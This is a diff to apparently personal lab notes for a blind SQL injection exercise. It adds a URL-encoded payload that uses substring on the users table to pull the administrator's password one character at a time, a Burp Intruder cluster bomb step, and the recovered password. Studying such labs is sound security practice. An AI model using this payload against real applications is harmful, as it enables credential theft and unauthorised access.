@@ -49,8 +49,17 @@ i will try numbers 1 to 19 all valid  password >19
 
 go to intruder  > cluster bomb
 
+```sql
+'+AND+(SELECT+substring(password,1,1)+FROM+users+WHERE+username%3d'administrator')%3d'8'--
+```
+
 <figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
 
-<pre><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
-<strong>8oiqhj3w6k9bfypfq71j1                         8
-</strong></code></pre>
+```
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+8oiqhj3w6k9bfypfq7j1
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+offfffffffffffffffffffffff! :smile: :tada:
